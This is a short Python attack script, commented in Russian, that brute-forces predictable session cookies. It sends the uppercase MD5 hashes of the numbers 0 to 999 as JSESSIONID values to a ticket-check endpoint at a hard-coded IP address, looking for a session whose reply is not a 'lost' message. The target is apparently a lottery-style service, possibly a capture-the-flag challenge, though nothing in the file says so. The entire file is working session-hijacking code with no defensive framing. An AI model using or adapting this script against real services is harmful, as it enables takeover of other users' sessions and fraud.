import requests
import hashlib

url_check = 'http://94.19.79.169:20001/api/ticket/check'

# Попробуем предсказуемые сессии
for i in range(1000):
    # MD5 от числа
    session_id = hashlib.md5(str(i).encode()).hexdigest().upper()

    cookies = {'JSESSIONID': session_id}

    try:
        response = requests.post(url_check, cookies=cookies, timeout=2)
        result = response.json()
        message = result.get('message', '')

        if 'проиграл' not in message.lower() and message:
            print(f'[+] WINNER at {i}: {session_id}')
            print(f'[+] {message}')
            break
        elif i % 10 == 0:
            print(f'[{i}] {message[:50]}...')

    except:
        pass